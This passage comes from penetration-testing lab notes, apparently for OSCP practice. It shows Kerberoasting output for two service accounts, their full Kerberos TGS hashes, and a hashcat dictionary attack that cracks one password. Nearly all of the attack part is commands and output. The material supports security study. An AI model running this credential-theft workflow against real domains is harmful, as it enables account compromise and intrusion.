+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>[*] Total kerberoastable users : 2
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>[*] SamAccountName         : sql_svc
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=oscp,DC=exam
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>[*] ServicePrincipalName   : MSSQL/MS02.oscp.exam
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>[*] PwdLastSet             : 12/5/2022 5:49:44 AM
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>[*] Supported ETypes       : RC4_HMAC_DEFAULT
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>[*] Hash written to C:\temp\hashes.kerberoast
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>[*] SamAccountName         : web_svc
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>[*] DistinguishedName      : CN=web_svc,CN=Users,DC=oscp,DC=exam
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>[*] ServicePrincipalName   : HTTP/MS01.oscp.exam
+<a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>[*] PwdLastSet             : 11/10/2022 11:11:19 PM
+<a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a>[*] Supported ETypes       : RC4_HMAC_DEFAULT
+<a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a>[*] Hash written to C:\temp\hashes.kerberoast
+<a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a>
+<a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a>[*] Roasted hashes written to : C:\temp\hashes.kerberoast
+</code></pre></div>
+<p>Showing
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>PS C:\temp&gt; type hashes.kerberoast
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>type hashes.kerberoast
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$1723359DF0B2FAC7CF7AD12EA41DBA63$DD60E085D0AE20ABD88B183AA65765FD1A4A18536A07CD487EAAC8B42462C6EDC839F287CE903A96D53BFB060A0E8EFDFA0B81995FCDB66E0EE02800283DC845F57489D16AE251166F56FB07E5FD5F6FAF2FF17761B2FE9F0242D2D4541508DE5CE982074AC7AF073CE30E9A0D9CD2D3ED3410E356B1D7B0DD663C1C0D54702A8157D349A629A516E93C3AA0C63AA36A3B1BB5F73C6BBFBB7C8839A6306FCB8ED357DA0AEC3A2A47EBA2D43C13A83679565157234F0CC5E3A411FD9FE2468679F7C2EFC02AD965694B204D40648E10D0223FC8C4CD27B9619AE8D8DBAA276E422921BE863D6F97F1B9EC7A36D6654BB2190608D5C5AB45DF05DCA8362FB85E2C7C4C0B3EF1A2EE46DF3597F1AC5FF8519A4972CA040CBD2F1816777BCA524928BE38BB31A64245A321A3D6FCE60AC979E8738F36E144E8D70CEC0F8EC09F46471038C76B22A6CD3F8C84238A7EED5CDDAE7419BEEF2E6721053503DD118EB02F3C4DF36315D7605B31D8E8AD84E6B1E1DE795B660E81D50FF0885E26CCC15C578B994E24C313FE58D0F512B4E9D8BEECB963FFF8063F9C4CE3D237ACCB3CD0E3FF6DE15FA686BDBEA21AF3F3FDF1D16527424053D3E3499C5D5997BA377241620592A8FCB557F132D2B183D659906C3293B7314F7C3F8D7814A34950374DA7856995ECF7A858B068B607B69B7D75799A0699F49463BC5F33011071799B4F4137F92584CB67ED37E352CF15B23195767F48FAC172168AF337AE9FF74F54FF21ABF85A734B5734A61F9A194200DC1BF5C09071299DC53CD0CF6A8D7B43891296B6ABDC4FDB9D6B9D87DF8C1BC6F6C9610B05F587F1583ADA3BE96ED0652FE11FEDCA79A1C3BBFFA9059AF0A88548ED7EC8F4B6C4E4764A8F5104C5B281626EFB60B00C575857DD6F3C880A62E4162E1B6DED54AA57DFF1F1B9F9FA96B8C5825C1F1A99B61B4EA4FA117A6D9CDF11D0CCA03D3428C10588834D558C0A98D6AFCCA466FEFE8CD3D88FBC3C9127F90E632349624766FDC0379B6E002AD0E77D71B60BAAC4C9F58F786C5D3E2FDCC393E39D47DC4449C43D91B3A7110862E7EA8A78182D320B9142A0FA0EC3CE461F5FF126D293FDE3A1A5DBD7FA4C37C98A12DFE4B402A0E0C344A2BE9700C1277193D500B336E42883CFD1443324D6DFD263EE75F213D8EA4FF4417FB364E58453DB827878F01041CF32DAEA56BFAE86126C88311F8AA2893B564CD7F0EB6192ADDFDA2AFBB1F8956D755AB0AF6F2B039F512281C4B72EF5264CDCB73C147BCB8968FFC35C696990D4E56984A2D566582CB866A02F2B1B9B5815BBF5E0B36BD715CD08C519D2C8FE4455AF3C2DBFA6C3AA1CA93C207BA5FDAEF0540C694FF545AB9E88CB8651E5B911EFD9CF73A6B30756FEB87ED3291CD33D0033B37D01DE0062B25BA1CBC13A6E99F36826EE7F14FF651962F83FA1CDF63DDA437F7B12F0F4BED383D069518E8AE743C38F326EE23B45E67137C6F4F9BCE9653CC28BD08CB98F20094938E5E85D74E9BE8EE08B
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$7F4B76D74845353D6F84CDBA6D97BB21$F6FD04436942621E023A47B12C27E5C8AA6BBD3A65C2B792E38070A5C6335033149BC01D572736163B85954DC1D194ABE3FC58301287C4CE7368E71ABE6C69D9963C1CD537D223C21EEAB5C0115249B6A768D536D4E97FF1B9DB7C02D0DAC9078231F13C275847783E89E7215341A1970BE65B61C26FF2704522620BBE05BB5184BFC4C6DD26C1FD68014CDE5D15DB0AE0E9446567B736B0B3A410228915BC1C6BD3DC274D291A0069095FB5575B8881142BD1961F8A375AEBB724FEFF4CE967BFC5AE58703B0213C30EFF0D9EC9B3853CB3046711624BFD2127C8C04AAE673FAB89FB19DF06C9954ED2F27DC0D4E23492A46A6093166A26AEC377FE9A3E2E1048BFD75C8A4A3268F5A8BBFCE2C8E12278A78E22990BD3362CDBA5F008A2EAE25914BF274B5B758D18AE02901FD15AD7F99CE7F6957F29FD21BF5580CF0D30E0F19C792E61300550734ED065AFBD46039B6DA1D22CBA48953AA72E963ACBDE83AAC31B12E40DFA1D7CD0A4D612B2078B063434F8C263F69E9D8F50B818D1B35618D3E63A07A90BB5C1F5C6FE283D1657BFAFCDDCB66B478855221E3A517E1D18D4759BA80D4635F5ED2CADF48CF8419CA2E2AA470E9321050D1D8156DB306E297B5B8E190B089688D31DE3F0B7794959E57847427E5923101DA4BC5B3B6DABAD30535AC08E65AAB521DD81EE71E7117A8F700E5862EEB2E718C82CEEA96BC3961D69FBD1D22EF1FA55081564D4AA4503A71858520CC650062720A7A522A36A06B1EDFD23BBA8C975211A10550E8F86AE84AFF5CC2982C80235147241D59EC5C682C3CF989FB1A78E49EB6EFB666AC225F69C3A63E7B4ECE27A749D4B51C8E46DF6940ED6D256E343D9A04C40D785459B80DA4DDBAEEC84BFE3198AA6D6CF2387176A0A67523B528EC6784396C70A703EF1616BD66111CAFFBCAD7B295553C486F73C73122E3BCC22DF46BB42E30FC04612ADB1C7E74A2615048B463C34951A77482DBCB8964BF85D95A40DE2A2C0642F90BE8324B10C49E3EE3BF229AADD8FAB4D7C329C052C03429B82DA0B11680D05B3C7AB1BAEE38EC974C6C09DDE5605C35461AB8BA7D68ED54447A4EF0BCCBEC6CFD12094BBBF3BAA7FC3C9B5159DB4DB94AA65C99292299055BCA2D2AE2553FFA8B4873DD73D337BF62BEDCE772584B2B638D3E0DC89F47153D066359D76ECF7E31B372AFE9262689C5847EB7BF1E570CCE214F5B7C205FF3DE30030F509CDBAEF586C33778859420CB7FA89AA5DDC8A96602A7C677BEA247CA63AF5FAFC8C3E39E09F56769E254E021EB8C13ECE5DF643590FA384219CA76C82E8E29B2FE2C50FBCFC815DD8D6ED96F24AAA76E59362DD754CE473B1AAF1439B149B8C188D597362D3792801BFDCFA128F45427519CECA723B8958938A2E899B93FC4AE2DE6C6B210A644AAFCBB3D5B751B369948ACE26AA78C61F5B1D47CB5AE46DF79DC177D98D100586AB389E42D7989CA891E25276DB6A8BC8DBE777BE5302C7FAD55C05CFF9BAE8808A1C1287
+</code></pre></div></p>
+<p>Put it on my kali
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>└─$ nano hashes.kerberoast
+</code></pre></div>
+using 13100 - &gt; TGS-REP -&gt; <code>krb5tgs$23$</code>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>kali@kali:~$ hashcat --help | grep -i &quot;Kerberos&quot;         
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+</code></pre></div></p>
+<p>Cracking
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>└─$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>[sudo] password for kali: 
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>hashcat (v6.2.6) starting
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>You have enabled --force to bypass dangerous warnings and errors!
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>This can hide serious problems and should only be done when debugging.
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>Do not report hashcat issues encountered when using --force.
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>============================================================================================================================================
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2553/5171 MB (1024 MB allocatable), 4MCU
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>Minimum password length supported by kernel: 0
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>Maximum password length supported by kernel: 256
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>Hashes: 2 digests; 2 unique digests, 2 unique salts
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>Rules: 77
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>Optimizers applied:
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>* Zero-Byte
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>* Not-Iterated
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>ATTENTION! Pure (unoptimized) backend kernels selected.
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>Pure kernels can crack longer passwords, but drastically reduce performance.
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>If you want to switch to optimized kernels, append -O to your commandline.
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>See the above message to find out about the exact limits.
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>
+<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>Watchdog: Temperature abort trigger set to 90c
+<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>
+<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a>Host memory required for this attack: 1 MB
+<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>
+<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>Dictionary cache hit:
+<a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>* Filename..: /usr/share/wordlists/rockyou.txt
+<a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>* Passwords.: 14344385
+<a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a>* Bytes.....: 139921507
+<a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a>* Keyspace..: 1104517645
+<a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>
+<a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a>$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$7f4b76d74845353d6f84cdba6d97bb21$f6fd04436942621e023a47b12c27e5c8aa6bbd3a65c2b792e38070a5c6335033149bc01d572736163b85954dc1d194abe3fc58301287c4ce7368e71abe6c69d9963c1cd537d223c21eeab5c0115249b6a768d536d4e97ff1b9db7c02d0dac9078231f13c275847783e89e7215341a1970be65b61c26ff2704522620bbe05bb5184bfc4c6dd26c1fd68014cde5d15db0ae0e9446567b736b0b3a410228915bc1c6bd3dc274d291a0069095fb5575b8881142bd1961f8a375aebb724feff4ce967bfc5ae58703b0213c30eff0d9ec9b3853cb3046711624bfd2127c8c04aae673fab89fb19df06c9954ed2f27dc0d4e23492a46a6093166a26aec377fe9a3e2e1048bfd75c8a4a3268f5a8bbfce2c8e12278a78e22990bd3362cdba5f008a2eae25914bf274b5b758d18ae02901fd15ad7f99ce7f6957f29fd21bf5580cf0d30e0f19c792e61300550734ed065afbd46039b6da1d22cba48953aa72e963acbde83aac31b12e40dfa1d7cd0a4d612b2078b063434f8c263f69e9d8f50b818d1b35618d3e63a07a90bb5c1f5c6fe283d1657bfafcddcb66b478855221e3a517e1d18d4759ba80d4635f5ed2cadf48cf8419ca2e2aa470e9321050d1d8156db306e297b5b8e190b089688d31de3f0b7794959e57847427e5923101da4bc5b3b6dabad30535ac08e65aab521dd81ee71e7117a8f700e5862eeb2e718c82ceea96bc3961d69fbd1d22ef1fa55081564d4aa4503a71858520cc650062720a7a522a36a06b1edfd23bba8c975211a10550e8f86ae84aff5cc2982c80235147241d59ec5c682c3cf989fb1a78e49eb6efb666ac225f69c3a63e7b4ece27a749d4b51c8e46df6940ed6d256e343d9a04c40d785459b80da4ddbaeec84bfe3198aa6d6cf2387176a0a67523b528ec6784396c70a703ef1616bd66111caffbcad7b295553c486f73c73122e3bcc22df46bb42e30fc04612adb1c7e74a2615048b463c34951a77482dbcb8964bf85d95a40de2a2c0642f90be8324b10c49e3ee3bf229aadd8fab4d7c329c052c03429b82da0b11680d05b3c7ab1baee38ec974c6c09dde5605c35461ab8ba7d68ed54447a4ef0bccbec6cfd12094bbbf3baa7fc3c9b5159db4db94aa65c99292299055bca2d2ae2553ffa8b4873dd73d337bf62bedce772584b2b638d3e0dc89f47153d066359d76ecf7e31b372afe9262689c5847eb7bf1e570cce214f5b7c205ff3de30030f509cdbaef586c33778859420cb7fa89aa5ddc8a96602a7c677bea247ca63af5fafc8c3e39e09f56769e254e021eb8c13ece5df643590fa384219ca76c82e8e29b2fe2c50fbcfc815dd8d6ed96f24aaa76e59362dd754ce473b1aaf1439b149b8c188d597362d3792801bfdcfa128f45427519ceca723b8958938a2e899b93fc4ae2de6c6b210a644aafcbb3d5b751b369948ace26aa78c61f5b1d47cb5ae46df79dc177d98d100586ab389e42d7989ca891e25276db6a8bc8dbe777be5302c7fad55c05cff9bae8808a1c1287:Diamond1
+<a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>Cracking performance lower than expected?                 
+<a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a>
+<a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a>* Append -O to the commandline.
+<a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a>  This lowers the maximum supported password/salt length (usually down to 32).
+<a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a>
+<a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a>* Append -w 3 to the commandline.
+<a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a>  This can cause your screen to lag.
+<a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>
+<a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a>* Append -S to the commandline.
+<a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>  This has a drastic speed impact but can be better for specific attacks.
+<a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a>  Typical scenarios are a small wordlist but a large ruleset.
+<a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a>
+<a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a>* Update your backend API runtime / driver the right way:
+<a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a>  https://hashcat.net/faq/wrongdriver
+<a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a>
+<a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a>* Create more work items to make use of your parallelization power:
+<a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a>  https://hashcat.net/faq/morework
+<a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a>
+<a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a>[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt; 
+<a id="__codelineno-7-60" name="__codelineno-7-60" href="#__codelineno-7-60"></a>Approaching final keyspace - workload adjusted.           
+<a id="__codelineno-7-61" name="__codelineno-7-61" href="#__codelineno-7-61"></a>
+<a id="__codelineno-7-62" name="__codelineno-7-62" href="#__codelineno-7-62"></a>
+<a id="__codelineno-7-63" name="__codelineno-7-63" href="#__codelineno-7-63"></a>Session..........: hashcat
+<a id="__codelineno-7-64" name="__codelineno-7-64" href="#__codelineno-7-64"></a>Status...........: Exhausted
+<a id="__codelineno-7-65" name="__codelineno-7-65" href="#__codelineno-7-65"></a>Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+<a id="__codelineno-7-66" name="__codelineno-7-66" href="#__codelineno-7-66"></a>Hash.Target......: hashes.kerberoast
+<a id="__codelineno-7-67" name="__codelineno-7-67" href="#__codelineno-7-67"></a>Time.Started.....: Mon Sep 23 17:54:19 2024, (8 mins, 55 secs)
+<a id="__codelineno-7-68" name="__codelineno-7-68" href="#__codelineno-7-68"></a>Time.Estimated...: Mon Sep 23 18:03:14 2024, (0 secs)
+<a id="__codelineno-7-69" name="__codelineno-7-69" href="#__codelineno-7-69"></a>Kernel.Feature...: Pure Kernel
+<a id="__codelineno-7-70" name="__codelineno-7-70" href="#__codelineno-7-70"></a>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+<a id="__codelineno-7-71" name="__codelineno-7-71" href="#__codelineno-7-71"></a>Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+<a id="__codelineno-7-72" name="__codelineno-7-72" href="#__codelineno-7-72"></a>Guess.Queue......: 1/1 (100.00%)
+<a id="__codelineno-7-73" name="__codelineno-7-73" href="#__codelineno-7-73"></a>Speed.#1.........:  2108.3 kH/s (5.79ms) @ Accel:128 Loops:38 Thr:1 Vec:8
+<a id="__codelineno-7-74" name="__codelineno-7-74" href="#__codelineno-7-74"></a>Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
+<a id="__codelineno-7-75" name="__codelineno-7-75" href="#__codelineno-7-75"></a>Progress.........: 2209035290/2209035290 (100.00%)
+<a id="__codelineno-7-76" name="__codelineno-7-76" href="#__codelineno-7-76"></a>Rejected.........: 0/2209035290 (0.00%)
+<a id="__codelineno-7-77" name="__codelineno-7-77" href="#__codelineno-7-77"></a>Restore.Point....: 14344385/14344385 (100.00%)
+<a id="__codelineno-7-78" name="__codelineno-7-78" href="#__codelineno-7-78"></a>Restore.Sub.#1...: Salt:1 Amplifier:76-77 Iteration:0-38
+<a id="__codelineno-7-79" name="__codelineno-7-79" href="#__codelineno-7-79"></a>Candidate.Engine.: Device Generator
+<a id="__codelineno-7-80" name="__codelineno-7-80" href="#__codelineno-7-80"></a>Candidates.#1....: $HEX[2074656e616e] -&gt; $HEX[04a156616d6f]
+<a id="__codelineno-7-81" name="__codelineno-7-81" href="#__codelineno-7-81"></a>Hardware.Mon.#1..: Util: 91%
+<a id="__codelineno-7-82" name="__codelineno-7-82" href="#__codelineno-7-82"></a>
+<a id="__codelineno-7-83" name="__codelineno-7-83" href="#__codelineno-7-83"></a>Started: Mon Sep 23 17:54:17 2024
+<a id="__codelineno-7-84" name="__codelineno-7-84" href="#__codelineno-7-84"></a>Stopped: Mon Sep 23 18:03:15 2024
+</code></pre></div>
+web_svc: Diamond1</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.prune", "navigation.top", "search.highlight", "search.suggest", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
